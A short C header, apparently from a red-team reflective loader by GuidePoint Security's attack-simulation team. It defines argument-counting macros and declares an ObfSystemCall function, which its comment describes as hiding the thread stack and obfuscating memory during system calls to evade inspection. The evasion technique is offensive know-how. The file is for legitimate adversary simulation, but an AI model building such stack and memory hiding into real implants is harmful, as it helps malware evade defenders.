/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack SimulatioN
 *
**/

#pragma once

/* Macros for assistance */
#define OBF_ARG_LEN_( _0, _1, _2, _3, _4, _5, _6, _7, _8, _9, _10, _11, _12, _13, _14, _15, _16, _17, _18, _19, _20, N, ... ) N
#define OBF_ARG_LEN( ... ) OBF_ARG_LEN_( 0, ## __VA_ARGS__, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 )
#define OBF_EXECUTE( Addr, ... ) ObfSystemCall( Addr, OBF_ARG_LEN( __VA_ARGS__ ), __VA_ARGS__ )

/*!
 *
 * Purpose:
 *
 * Sets up a temporary stack for the call to avoid
 * using up too much memory. Leverages ObjectFiber
 * to obfuscate the current memory, and hide the
 * thread stack while awaiting the functions
 * completion.
 *
!*/
D_SEC( E ) NTSTATUS NTAPI ObfSystemCall( _In_ PVOID Addr, _In_ UINT32 Argc, ... );
